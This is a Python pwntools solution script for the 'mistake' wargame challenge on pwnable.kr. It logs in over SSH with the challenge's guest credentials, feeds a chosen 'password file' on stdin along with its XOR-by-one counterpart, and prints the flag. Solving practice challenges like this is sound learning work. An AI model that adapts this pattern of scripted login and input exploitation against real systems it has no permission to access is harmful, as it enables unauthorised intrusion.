#!/usr/bin/python
from pwn import *

# "password file" contents
password_fd_contents = '1111111111'
# Automatically build our user input based on that
user_input = []
for char in password_fd_contents:
    user_input.append(chr(ord(char)^1))
user_input = ''.join(user_input)

# Start a new ssh session to the box:
session = ssh(host='pwnable.kr', user='mistake', password='guest', port=2222)
assert session.connected()

# Execute ./mistake on the session:
process = session.process(executable='./mistake')

# Send our payload to it, since it'll expect us to enter the password file to STDIN:
process.sendline(password_fd_contents)

# Then wait until it prompts us for input and give it the correct opposite:
process.recvuntil("input password : ")
process.sendline(user_input)

# Get flag
while 1<2:
    try:
        print(process.recvlineS())
    except EOFError as e:
        break

